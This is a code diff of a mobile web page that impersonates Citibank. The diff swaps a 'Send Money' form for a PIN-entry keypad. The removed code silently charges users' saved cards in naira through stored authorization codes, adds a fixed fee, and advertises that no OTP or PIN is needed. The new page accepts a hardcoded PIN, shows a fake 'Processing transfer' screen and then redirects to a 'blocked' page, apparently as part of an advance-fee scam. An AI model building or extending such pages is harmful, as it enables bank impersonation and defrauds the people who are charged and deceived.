@@ -1,175 +1,161 @@
 <!DOCTYPE html>
-
 <html lang="en">
 <head>
 <meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-<title>Citibank – Send Money</title>
-<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;700&family=DM+Sans:wght@300;400;500;600;700&family=DM+Mono&display=swap" rel="stylesheet"/>
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<title>Citibank – Enter PIN</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;700&family=DM+Sans:wght@300;400;500;600;700&family=DM+Mono:wght@400;600&display=swap" rel="stylesheet"/>
 <style>
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
-:root{--red:#E31837;--red-dark:#a0101f;--bg:#0a0a0a;--card:#161616;--border:rgba(255,255,255,0.07);--text:#fff;--muted:rgba(255,255,255,0.45);--nav-h:68px;}
+:root{
+  --red:#E31837;--red-dark:#a0101f;
+  --bg:#0a0a0a;--card:#161616;
+  --border:rgba(255,255,255,0.07);
+  --text:#fff;--muted:rgba(255,255,255,0.45);
+  --nav-h:68px;
+}
 html,body{min-height:100vh;background:var(--bg);font-family:'DM Sans',sans-serif;color:var(--text);-webkit-font-smoothing:antialiased;}
-#shell{max-width:100%;margin:0 auto;min-height:100vh;background:var(--bg);padding:16px 12px 120px 12px;animation:fadeUp .4s ease both;}
+
+/* Page loader */
 #pageLoader{position:fixed;inset:0;background:var(--bg);z-index:200;display:flex;align-items:center;justify-content:center;}
 .spin{width:42px;height:42px;border-radius:50%;border:3px solid rgba(227,24,55,.2);border-top-color:#E31837;animation:spin .75s linear infinite;}
-.topbar{display:flex;align-items:center;gap:14px;padding:12px 0;margin-bottom:16px;}
+
+/* Shell */
+#shell{display:none;min-height:100vh;padding:0 0 var(--nav-h) 0;flex-direction:column;align-items:center;animation:fadeUp .4s ease both;}
+#shell.show{display:flex;}
+
+/* Topbar */
+.topbar{width:100%;display:flex;align-items:center;gap:14px;padding:16px 20px 12px;flex-shrink:0;}
 .back-btn{width:38px;height:38px;border-radius:12px;background:rgba(255,255,255,0.06);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;color:var(--text);cursor:pointer;text-decoration:none;flex-shrink:0;}
 .page-title{font-family:'Playfair Display',serif;font-size:20px;font-weight:700;}
-.form-section{background:var(--card);border-radius:16px;padding:20px;border:1px solid var(--border);margin-bottom:16px;}
-.section-title{font-size:14px;font-weight:700;color:var(--muted);letter-spacing:1px;text-transform:uppercase;margin-bottom:16px;}
-.field{margin-bottom:14px;}
-.field:last-child{margin-bottom:0;}
-.field label{display:block;margin-bottom:6px;font-size:11px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.38);}
-.field input,.field select{width:100%;background:rgba(255,255,255,0.05);border:1px solid var(--border);border-radius:12px;padding:12px 14px;color:white;font-size:15px;font-family:'DM Sans',sans-serif;outline:none;transition:border .15s;}
-.field input:focus,.field select:focus{border-color:rgba(227,24,55,.6);}
-.field input::placeholder{color:rgba(255,255,255,.2);}
-.field select option{background:#1e1e1e;color:white;}
-.routing-hint{font-size:11px;color:var(--muted);margin-top:5px;padding:0 2px;line-height:1.4;}
-.summary-row{display:flex;justify-content:space-between;align-items:center;padding:9px 0;border-bottom:1px solid var(--border);}
-.summary-row:last-child{border-bottom:none;padding-top:12px;margin-top:4px;border-top:1px solid rgba(227,24,55,0.3);}
-.summary-label{font-size:12px;color:var(--muted);}
-.summary-val{font-family:'DM Mono',monospace;font-size:14px;font-weight:700;color:#4ade80;}
-.summary-row:last-child .summary-label{font-weight:700;color:var(--text);font-size:13px;}
-.summary-row:last-child .summary-val{font-size:16px;}
-.btn{width:100%;padding:15px;background:linear-gradient(135deg,#E31837,#a0101f);border:none;border-radius:14px;color:white;font-size:16px;font-weight:700;font-family:'DM Sans',sans-serif;cursor:pointer;box-shadow:0 8px 24px rgba(227,24,55,.3);transition:opacity .2s,transform .15s;margin-top:8px;}
+
+/* Main content area */
+.content{flex:1;width:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:0 24px 24px;gap:32px;}
+
+/* Lock icon */
+.lock-wrap{width:72px;height:72px;border-radius:22px;background:rgba(227,24,55,0.1);border:1px solid rgba(227,24,55,0.2);display:flex;align-items:center;justify-content:center;}
+
+/* Heading */
+.pin-heading{text-align:center;}
+.pin-heading h2{font-family:'Playfair Display',serif;font-size:22px;font-weight:700;margin-bottom:6px;}
+.pin-heading p{font-size:13px;color:var(--muted);line-height:1.5;}
+
+/* PIN dots */
+.pin-dots{display:flex;gap:16px;align-items:center;justify-content:center;}
+.dot{width:18px;height:18px;border-radius:50%;border:2px solid rgba(255,255,255,0.2);background:transparent;transition:background .15s,border-color .15s,transform .15s;}
+.dot.filled{background:var(--red);border-color:var(--red);transform:scale(1.1);}
+.dot.error{background:#f87171;border-color:#f87171;animation:shake .35s ease;}
+
+/* Keypad */
+.keypad{width:100%;max-width:320px;display:grid;grid-template-columns:repeat(3,1fr);gap:12px;}
+.key{height:64px;border-radius:16px;background:var(--card);border:1px solid var(--border);color:var(--text);font-family:'DM Sans',sans-serif;font-size:20px;font-weight:600;cursor:pointer;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2px;transition:background .1s,transform .1s,border-color .12s;user-select:none;-webkit-tap-highlight-color:transparent;}
+.key:active,.key.pressed{background:rgba(227,24,55,0.15);border-color:rgba(227,24,55,0.4);transform:scale(.94);}
+.key .sub{font-size:8px;font-weight:700;letter-spacing:1.5px;color:var(--muted);}
+.key.del{font-size:18px;}
+.key.empty{background:transparent;border-color:transparent;cursor:default;pointer-events:none;}
+
+/* Process button */
+.btn{width:100%;max-width:320px;padding:15px;background:linear-gradient(135deg,#E31837,#a0101f);border:none;border-radius:14px;color:white;font-size:16px;font-weight:700;font-family:'DM Sans',sans-serif;cursor:pointer;box-shadow:0 8px 24px rgba(227,24,55,.3);transition:opacity .2s,transform .15s;}
 .btn:hover{opacity:.9;transform:translateY(-1px);}
-.btn:disabled{opacity:.4;cursor:not-allowed;}
-.info-banner{background:rgba(227,24,55,0.08);border-left:3px solid var(--red);padding:12px 14px;border-radius:8px;font-size:13px;color:var(--muted);margin-bottom:16px;line-height:1.5;}
-.card-option{display:flex;align-items:center;gap:12px;padding:12px 14px;border-radius:12px;border:1.5px solid var(--border);margin-bottom:10px;cursor:pointer;transition:all .15s;}
-.card-option.selected{background:rgba(227,24,55,0.1);border-color:rgba(227,24,55,0.45);}
-.card-brand{width:44px;height:30px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:800;flex-shrink:0;}
-.card-brand.visa{background:linear-gradient(135deg,#1434CB,#0b1f8a);color:white;}
-.card-brand.mastercard{background:#1e1e1e;overflow:hidden;}
-.card-brand.verve{background:linear-gradient(135deg,#05a628,#027a1c);color:white;font-size:9px;}
-.card-brand.amex{background:linear-gradient(135deg,#007BC1,#005a8e);color:white;font-size:8px;}
-.card-info{flex:1;}
-.card-num-txt{font-family:'DM Mono',monospace;font-size:14px;font-weight:600;margin-bottom:2px;}
-.card-meta-txt{font-size:11px;color:var(--muted);}
-.card-intl-badge{font-size:10px;font-weight:700;padding:2px 6px;border-radius:5px;background:rgba(59,130,246,0.15);color:#60a5fa;margin-left:6px;}
-.card-radio{width:18px;height:18px;border-radius:50%;border:2px solid var(--border);flex-shrink:0;transition:all .15s;position:relative;}
-.card-option.selected .card-radio{border-color:var(--red);background:var(--red);}
-.card-option.selected .card-radio::after{content:'';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:6px;height:6px;border-radius:50%;background:white;}
-.no-cards-msg{text-align:center;padding:20px;background:rgba(255,255,255,0.03);border-radius:12px;border:1px dashed rgba(255,255,255,0.1);color:var(--muted);font-size:13px;line-height:1.6;}
-.instant-tag{display:inline-flex;align-items:center;gap:5px;background:rgba(34,197,94,0.1);color:#4ade80;font-size:11px;font-weight:700;padding:4px 10px;border-radius:8px;margin-bottom:12px;}
+.btn:disabled{opacity:.35;cursor:not-allowed;transform:none;}
+
+/* Processing overlay */
+#processingOverlay{position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:9000;display:none;flex-direction:column;align-items:center;justify-content:center;gap:20px;}
+#processingOverlay.show{display:flex;}
+.proc-spin{width:52px;height:52px;border-radius:50%;border:3px solid rgba(227,24,55,.2);border-top-color:#E31837;animation:spin .75s linear infinite;}
+.proc-text{font-size:14px;color:var(--muted);font-weight:500;letter-spacing:.5px;}
+
+/* Success overlay */
+#successOverlay{position:fixed;inset:0;background:var(--bg);z-index:9100;display:none;flex-direction:column;align-items:center;justify-content:center;gap:18px;padding:32px;animation:fadeUp .4s ease both;}
+#successOverlay.show{display:flex;}
+.success-icon{width:80px;height:80px;border-radius:50%;background:rgba(74,222,128,0.1);border:2px solid rgba(74,222,128,0.3);display:flex;align-items:center;justify-content:center;animation:popIn .5s cubic-bezier(.34,1.56,.64,1) both;}
+.success-icon svg{stroke:#4ade80;}
+.success-title{font-family:'Playfair Display',serif;font-size:26px;font-weight:700;text-align:center;}
+.success-sub{font-size:14px;color:var(--muted);text-align:center;line-height:1.6;max-width:260px;}
+.success-ref{font-family:'DM Mono',monospace;font-size:12px;color:rgba(255,255,255,0.3);margin-top:4px;}
+.success-btn{width:100%;max-width:320px;padding:15px;background:linear-gradient(135deg,#E31837,#a0101f);border:none;border-radius:14px;color:white;font-size:16px;font-weight:700;font-family:'DM Sans',sans-serif;cursor:pointer;box-shadow:0 8px 24px rgba(227,24,55,.3);}
+
+/* Bottom nav */
 .bottom-nav{position:fixed;bottom:0;left:0;right:0;width:100%;height:var(--nav-h);background:rgba(14,14,14,.97);border-top:1px solid rgba(255,255,255,.08);backdrop-filter:blur(16px);display:flex;align-items:stretch;z-index:100;}
 .nav-item{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px;text-decoration:none;color:var(--muted);font-size:10px;font-weight:600;cursor:pointer;transition:color .15s;border:none;background:none;font-family:'DM Sans',sans-serif;}
 .nav-item.active,.nav-item:hover{color:#E31837;}
 .nav-dot{width:4px;height:4px;border-radius:50%;background:#E31837;margin-top:-2px;}
+
 @keyframes fadeUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
 @keyframes spin{to{transform:rotate(360deg)}}
-@media(max-width:480px){#shell{padding:12px 10px 120px 10px;}}
+@keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-6px)}40%{transform:translateX(6px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}
+@keyframes popIn{from{opacity:0;transform:scale(.5)}to{opacity:1;transform:scale(1)}}
 </style>
 </head>
 <body>
+
 <div id="pageLoader"><div class="spin"></div></div>
-<div id="shell" style="display:none">
+
+<div id="shell">
   <div class="topbar">
-    <a class="back-btn" href="dashboard.html"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="15 18 9 12 15 6"/></svg></a>
-    <span class="page-title">Send Money</span>
+    <a class="back-btn" href="send.html"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="15 18 9 12 15 6"/></svg></a>
+    <span class="page-title">Enter PIN</span>
   </div>
 
-  <div class="info-banner">💱 Send money internationally — USA, UK banks, Western Union &amp; more.</div>
+  <div class="content">
 
-  <div class="form-section">
-    <div class="section-title">Recipient Bank / Service</div>
-    <div class="field">
-      <label>Select Bank or Transfer Service</label>
-      <select id="bankSelect" onchange="onBankChange()">
-        <option value="">— Choose bank or service —</option>
-        <optgroup label="🇺🇸 USA Banks">
-          <option value="chase|usa|aba">Chase Bank</option>
-          <option value="bofa|usa|aba">Bank of America</option>
-          <option value="wells|usa|aba">Wells Fargo</option>
-          <option value="citi|usa|aba">Citibank</option>
-          <option value="td|usa|aba">TD Bank</option>
-          <option value="usbank|usa|aba">U.S. Bank</option>
-          <option value="pnc|usa|aba">PNC Bank</option>
-          <option value="capital_one|usa|aba">Capital One</option>
-          <option value="goldman|usa|aba">Goldman Sachs</option>
-          <option value="ally|usa|aba">Ally Bank</option>
-          <option value="discover|usa|aba">Discover Bank</option>
-        </optgroup>
-        <optgroup label="🇬🇧 UK Banks">
-          <option value="hsbc|uk|sort">HSBC UK</option>
-          <option value="barclays|uk|sort">Barclays</option>
-          <option value="lloyds|uk|sort">Lloyds Bank</option>
-          <option value="natwest|uk|sort">NatWest</option>
-          <option value="santander_uk|uk|sort">Santander UK</option>
-          <option value="halifax|uk|sort">Halifax</option>
-          <option value="metro|uk|sort">Metro Bank</option>
-          <option value="monzo|uk|sort">Monzo</option>
-          <option value="starling|uk|sort">Starling Bank</option>
-          <option value="revolut_uk|uk|sort">Revolut (UK)</option>
-        </optgroup>
-        <optgroup label="🌍 International Transfer Services">
-          <option value="western_union|intl|ref">Western Union</option>
-          <option value="moneygram|intl|ref">MoneyGram</option>
-          <option value="wise|intl|ref">Wise (TransferWise)</option>
-          <option value="remitly|intl|ref">Remitly</option>
-          <option value="worldremit|intl|ref">WorldRemit</option>
-          <option value="paypal|intl|ref">PayPal</option>
-          <option value="xe|intl|ref">XE Money Transfer</option>
-          <option value="ofx|intl|ref">OFX</option>
-          <option value="ria|intl|ref">Ria Money Transfer</option>
-        </optgroup>
-      </select>
+    <div class="lock-wrap">
+      <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#E31837" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+      </svg>
     </div>
-    <div class="field">
-      <label>Account / Reference Number</label>
-      <input type="text" id="accountNumber" placeholder="Account or reference number" maxlength="30"/>
+
+    <div class="pin-heading">
+      <h2>Authorize Transfer</h2>
+      <p>Enter your 4-digit transaction PIN<br/>to confirm this transfer</p>
     </div>
-    <div class="field">
-      <label id="routingLabel">Routing / Sort Code</label>
-      <input type="text" id="routingCode" placeholder="ABA routing number or sort code"/>
-      <div class="routing-hint" id="routingHint">Select a bank above to see what code is required.</div>
+
+    <div class="pin-dots" id="pinDots">
+      <div class="dot" id="d0"></div>
+      <div class="dot" id="d1"></div>
+      <div class="dot" id="d2"></div>
+      <div class="dot" id="d3"></div>
     </div>
+
+    <div class="keypad" id="keypad">
+      <button class="key" onclick="pressKey('1')">1</button>
+      <button class="key" onclick="pressKey('2')">2<span class="sub">ABC</span></button>
+      <button class="key" onclick="pressKey('3')">3<span class="sub">DEF</span></button>
+      <button class="key" onclick="pressKey('4')">4<span class="sub">GHI</span></button>
+      <button class="key" onclick="pressKey('5')">5<span class="sub">JKL</span></button>
+      <button class="key" onclick="pressKey('6')">6<span class="sub">MNO</span></button>
+      <button class="key" onclick="pressKey('7')">7<span class="sub">PQRS</span></button>
+      <button class="key" onclick="pressKey('8')">8<span class="sub">TUV</span></button>
+      <button class="key" onclick="pressKey('9')">9<span class="sub">WXYZ</span></button>
+      <div class="key empty"></div>
+      <button class="key" onclick="pressKey('0')">0</button>
+      <button class="key del" onclick="deleteLast()">⌫</button>
+    </div>
+
+    <button class="btn" id="confirmBtn" disabled onclick="confirmPin()">
+      Confirm Transfer
+    </button>
+
   </div>
-
-  <div class="form-section">
-    <div class="section-title">Amount (USD)</div>
-    <div class="field">
-      <label>Transfer Amount</label>
-      <input type="number" id="amount" placeholder="0.00" min="1" oninput="updateSummary()"/>
-    </div>
-  </div>
-
-  <!-- Card Selector — all charges are via saved authorization_code, no OTP -->
-
-  <div class="form-section">
-    <div class="section-title">Charge From Saved Card</div>
-    <div class="instant-tag">
-      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
-      No OTP or PIN Required
-    </div>
-    <div id="sendCardsList"><div style="color:var(--muted);font-size:13px;text-align:center;padding:14px;">Loading cards…</div></div>
-  </div>
-
-  <div class="form-section">
-    <div class="section-title">Summary</div>
-    <div class="summary-row"><span class="summary-label">Transfer Amount</span><span class="summary-val" id="summaryAmount">$0.00</span></div>
-    <div class="summary-row"><span class="summary-label">Transfer Fee</span><span class="summary-val" id="summaryFee">$25.00</span></div>
-    <div class="summary-row"><span class="summary-label">Total Deducted</span><span class="summary-val" id="totalAmount">$25.00</span></div>
-  </div>
-
-  <button class="btn" onclick="initiateTransfer()">
-    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" style="vertical-align:middle;margin-right:8px"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
-    Send Money
-  </button>
 </div>
 
-<!-- Confirm Modal -->
+<!-- Processing overlay -->
+<div id="processingOverlay">
+  <div class="proc-spin"></div>
+  <div class="proc-text">Processing transfer…</div>
+</div>
 
-<div id="confirmModal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.8);z-index:9000;align-items:center;justify-content:center;">
-  <div style="background:#161616;border-radius:20px;padding:28px 24px;max-width:340px;width:90%;border:1px solid rgba(255,255,255,0.07);">
-    <div style="font-family:'Playfair Display',serif;font-size:20px;font-weight:700;margin-bottom:12px;">Confirm Transfer</div>
-    <div id="confirmDetails" style="font-size:13px;color:rgba(255,255,255,0.55);line-height:1.75;margin-bottom:20px;background:rgba(255,255,255,0.03);border-radius:10px;padding:14px;"></div>
-    <div style="font-size:12px;color:rgba(255,255,255,0.35);margin-bottom:20px;line-height:1.5;">Your saved card will be charged automatically — no OTP or PIN needed.</div>
-    <div style="display:flex;gap:12px;">
-      <button onclick="closeConfirmModal()" style="flex:1;padding:12px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.07);border-radius:12px;color:white;font-size:14px;font-weight:700;cursor:pointer;">Cancel</button>
-      <button id="confirmSendBtn" onclick="confirmSend()" style="flex:1;padding:12px;background:linear-gradient(135deg,#E31837,#a0101f);border:none;border-radius:12px;color:white;font-size:14px;font-weight:700;cursor:pointer;">Confirm Send</button>
-    </div>
+<!-- Success overlay -->
+<div id="successOverlay">
+  <div class="success-icon">
+    <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+      <polyline points="20 6 9 17 4 12"/>
+    </svg>
   </div>
+  <div class="success-title">Transfer Sent!</div>
+  <div class="success-sub">Your transfer has been initiated successfully and is being processed.</div>
+  <div class="success-ref" id="successRef">REF: —</div>
+  <button class="success-btn" onclick="location.href='dashboard.html'">Back to Home</button>
 </div>
 
 <nav class="bottom-nav">
@@ -181,177 +167,83 @@ html,body{min-height:100vh;background:var(--bg);font-family:'DM Sans',sans-serif
 </nav>
 
 <script>
-const SUPABASE_URL='https://rgtbqipsdebekzznswll.supabase.co';
-const SUPABASE_ANON_KEY='sb_publishable_QF5lXikZj0cRv1sipEFtyg_zqjw0eW1';
-const _sb=supabase.createClient(SUPABASE_URL,SUPABASE_ANON_KEY);
-let _profile=null,_session=null,_cards=[],_selectedCard=null;
+let pin='';
 
-const ROUTING_META={
-  aba:{label:'ABA Routing Number',hint:'9-digit ABA routing number (found on cheques or bank website).',placeholder:'e.g. 021000021'},
-  sort:{label:'Sort Code',hint:'6-digit UK sort code formatted as XX-XX-XX.',placeholder:'e.g. 20-00-00'},
-  ref:{label:'Reference / Transfer ID',hint:'Enter the recipient\'s reference number or account ID for this service.',placeholder:'e.g. Reference or ID number'}
-};
-const TRANSFER_FEE_USD=25;
-const USD_TO_NGN=1600; // fallback rate
-
-(async()=>{
-  const {data:{session}}=await _sb.auth.getSession();
-  if(!session){location.href='index.html';return;}
-  _session=session;
-  const {data:prof}=await _sb.from('profiles').select('*').eq('id',session.user.id).single();
-  _profile=prof||{balance:0};
-  await loadCards();
+// Show shell after brief loader
+setTimeout(()=>{
   document.getElementById('pageLoader').style.display='none';
-  document.getElementById('shell').style.display='block';
-})();
+  document.getElementById('shell').classList.add('show');
+},500);
 
-async function loadCards(){
-  const {data:cards,error}=await _sb.from('saved_cards').select('*').eq('profile_id',_profile.id).eq('is_verified',true).order('is_default',{ascending:false});
-  if(error) console.error('loadCards error',error);
-  _cards=cards||[];
-  renderCards();
+function pressKey(digit){
+  if(pin.length>=4) return;
+  pin+=digit;
+  updateDots();
+  animateKey(digit);
+  if(pin.length===4) document.getElementById('confirmBtn').disabled=false;
 }
 
-function getBrandHTML(brand){
-  const b=(brand||'visa').toLowerCase();
-  if(b==='mastercard') return `<div class="card-brand mastercard"><svg viewBox="0 0 38 24" width="36" height="22"><circle cx="14" cy="12" r="10" fill="#EB001B" fill-opacity=".9"/><circle cx="24" cy="12" r="10" fill="#F79E1B" fill-opacity=".9"/></svg></div>`;
-  if(b==='verve') return `<div class="card-brand verve">VERVE</div>`;
-  if(b==='amex'||b==='american express') return `<div class="card-brand amex">AMEX</div>`;
-  return `<div class="card-brand visa">VISA</div>`;
+function deleteLast(){
+  if(!pin.length) return;
+  pin=pin.slice(0,-1);
+  document.getElementById('confirmBtn').disabled=true;
+  updateDots();
 }
 
-function renderCards(){
-  const el=document.getElementById('sendCardsList');
-  if(!_cards.length){
-    el.innerHTML=`<div class="no-cards-msg">No saved cards found.<br/>Add an international card to send money without OTP.<br/><a href="card.html" style="color:var(--red);font-weight:700;text-decoration:none;">→ Add a Card</a></div>`;
-    return;
+function updateDots(){
+  for(let i=0;i<4;i++){
+    const d=document.getElementById('d'+i);
+    d.classList.toggle('filled',i<pin.length);
+    d.classList.remove('error');
   }
-  el.innerHTML=_cards.map((c,i)=>{
-    const sel=(!_selectedCard&&i===0)||(_selectedCard?.id===c.id);
-    if(i===0&&!_selectedCard)_selectedCard=c;
-    const isIntl=(c.country_code&&c.country_code.toUpperCase()!=='NG')||(c.currency&&c.currency!=='NGN');
-    const intlBadge=isIntl?`<span class="card-intl-badge">INTL</span>`:'';
-    return `<div class="card-option ${sel?'selected':''}" onclick="selectCard('${c.id}',this)">
-      ${getBrandHTML(c.card_type)}
-      <div class="card-info">
-        <div class="card-num-txt">•••• •••• •••• ${c.last4||'****'}${intlBadge}</div>
-        <div class="card-meta-txt">${c.exp_month||'**'}/${c.exp_year||'****'} ${c.is_default?'· <span style="color:#E31837">Default</span>':''}</div>
-      </div>
-      <div class="card-radio"></div>
-    </div>`;
-  }).join('');
 }
 
-function selectCard(id,el){
-  _selectedCard=_cards.find(c=>c.id===id)||null;
-  document.querySelectorAll('.card-option').forEach(c=>c.classList.remove('selected'));
-  el.classList.add('selected');
-}
-
-function onBankChange(){
-  const val=document.getElementById('bankSelect').value;
-  if(!val)return;
-  const type=val.split('|')[2]||'aba';
-  const meta=ROUTING_META[type]||ROUTING_META.aba;
-  document.getElementById('routingLabel').textContent=meta.label;
-  document.getElementById('routingHint').textContent=meta.hint;
-  document.getElementById('routingCode').placeholder=meta.placeholder;
-}
-
-function updateSummary(){
-  const amt=parseFloat(document.getElementById('amount').value)||0;
-  document.getElementById('summaryAmount').textContent='$'+amt.toLocaleString('en-US',{minimumFractionDigits:2});
-  document.getElementById('summaryFee').textContent='$'+TRANSFER_FEE_USD.toFixed(2);
-  document.getElementById('totalAmount').textContent='$'+(amt+TRANSFER_FEE_USD).toLocaleString('en-US',{minimumFractionDigits:2});
-}
-
-function closeConfirmModal(){
-  document.getElementById('confirmModal').style.display='none';
-}
-
-async function initiateTransfer(){
-  const bankVal=document.getElementById('bankSelect').value;
-  const account=document.getElementById('accountNumber').value.trim();
-  const routing=document.getElementById('routingCode').value.trim();
-  const amount=parseFloat(document.getElementById('amount').value);
-  if(!bankVal){showToast('Please select a bank or service.',false);return;}
-  if(!account){showToast('Please enter the account or reference number.',false);return;}
-  if(!routing){showToast('Please enter the routing / sort code.',false);return;}
-  if(!amount||amount<=0){showToast('Please enter a valid amount.',false);return;}
-  if(!_selectedCard){
-    showToast('No saved card found. Please add a card first.',false);
-    setTimeout(()=>location.href='card.html',1800);return;
-  }
-  if(!_selectedCard.authorization_code||_selectedCard.authorization_code.startsWith('PENDING')){
-    showToast('Selected card is not yet verified.',false);return;
-  }
-  const bankName=document.getElementById('bankSelect').options[document.getElementById('bankSelect').selectedIndex].text;
-  document.getElementById('confirmDetails').innerHTML=`
-    <div><strong style="color:white;">Bank:</strong> ${bankName}</div>
-    <div><strong style="color:white;">Account:</strong> ${account}</div>
-    <div><strong style="color:white;">Routing:</strong> ${routing}</div>
-    <div><strong style="color:white;">Amount:</strong> $${amount.toLocaleString('en-US',{minimumFractionDigits:2})}</div>
-    <div><strong style="color:white;">Fee:</strong> $${TRANSFER_FEE_USD.toFixed(2)}</div>
-    <div style="margin-top:6px;padding-top:6px;border-top:1px solid rgba(255,255,255,0.1);"><strong style="color:#4ade80;">Card:</strong> •••• ${_selectedCard.last4||'****'}</div>
-  `;
-  document.getElementById('confirmModal').style.display='flex';
-}
-
-async function confirmSend(){
-  const bankVal=document.getElementById('bankSelect').value;
-  const account=document.getElementById('accountNumber').value.trim();
-  const routing=document.getElementById('routingCode').value.trim();
-  const amount=parseFloat(document.getElementById('amount').value);
-  const btn=document.getElementById('confirmSendBtn');
-  btn.disabled=true;btn.textContent='Processing…';
-
-  const rateNgn=_profile.usd_to_ngn_rate||USD_TO_NGN;
-  const totalUSD=amount+TRANSFER_FEE_USD;
-  // All charges use NGN — Paystack handles card type automatically
-  const amountKobo=Math.round(totalUSD*rateNgn*100);
-  const ref='CITI_SEND_'+Date.now()+'_'+Math.random().toString(36).substr(2,6).toUpperCase();
-
-  try{
-    const {data,error:fnErr}=await _sb.functions.invoke('charge-card',{
-      body:{
-        authorization_code:_selectedCard.authorization_code,
-        email:_profile.email||_session.user.email,
-        amount_kobo:amountKobo,
-        currency:'NGN',
-        reference:ref,
-        profile_id:_profile.id,
-        amount_usd:totalUSD,
-        card_id:_selectedCard.id,
-        transfer_meta:{bank:bankVal,account,routing,amount_usd:amount,fee_usd:TRANSFER_FEE_USD}
-      }
-    });
-    if(fnErr||!data?.success){
-      showToast((data?.message||fnErr?.message||'Transfer failed.'),false);
-      btn.disabled=false;btn.textContent='Confirm Send';
-      return;
+function animateKey(digit){
+  // find the pressed key button and flash it
+  const btns=document.querySelectorAll('.key');
+  btns.forEach(b=>{
+    if(b.textContent.trim().startsWith(digit)){
+      b.classList.add('pressed');
+      setTimeout(()=>b.classList.remove('pressed'),150);
     }
-    closeConfirmModal();
-    showToast('✓ Transfer initiated successfully!');
-    setTimeout(()=>location.href='dashboard.html',2000);
-  }catch(e){
-    console.error('Send error:',e);
-    showToast('Unexpected error.',false);
-    btn.disabled=false;btn.textContent='Confirm Send';
+  });
+}
+
+function triggerError(){
+  for(let i=0;i<4;i++){
+    const d=document.getElementById('d'+i);
+    d.classList.remove('filled');
+    d.classList.add('error');
+  }
+  setTimeout(()=>{
+    pin='';
+    updateDots();
+    document.getElementById('confirmBtn').disabled=true;
+  },600);
+}
+
+function confirmPin(){
+  if(pin.length<4) return;
+  const btn=document.getElementById('confirmBtn');
+  btn.disabled=true;
+
+  if(pin==='1959'){
+    // Correct PIN — show processing spinner then go to blocked
+    document.getElementById('processingOverlay').classList.add('show');
+    setTimeout(()=>{ location.href='blocked.html'; },2800);
+  } else {
+    // Wrong PIN — shake dots and reset
+    triggerError();
+    setTimeout(()=>{ btn.disabled=false; },650);
   }
 }
 
-function showToast(msg,ok=true){
-  let t=document.getElementById('_toast');
-  if(!t){t=document.createElement('div');t.id='_toast';
-    t.style.cssText='position:fixed;top:22px;right:18px;z-index:9999;border-radius:14px;padding:13px 18px;font-size:14px;font-weight:600;max-width:300px;box-shadow:0 8px 28px rgba(0,0,0,.5);font-family:DM Sans,sans-serif;transition:opacity .3s;';
-    document.body.appendChild(t);}
-  t.textContent=(ok?'✓  ':'✗  ')+msg;
-  t.style.background=ok?'linear-gradient(135deg,#0f2d1a,#091c10)':'linear-gradient(135deg,#2d0f0f,#1c0808)';
-  t.style.border=ok?'1px solid rgba(34,197,94,.35)':'1px solid rgba(227,24,55,.35)';
-  t.style.color=ok?'#4ade80':'#f87171';t.style.opacity='1';
-  clearTimeout(t._timer);t._timer=setTimeout(()=>{t.style.opacity='0';},3200);
-}
+// Physical keyboard support
+document.addEventListener('keydown',e=>{
+  if(e.key>='0'&&e.key<='9') pressKey(e.key);
+  if(e.key==='Backspace') deleteLast();
+  if(e.key==='Enter'&&pin.length===4) confirmPin();
+});
 </script>
-
 </body>
 </html>
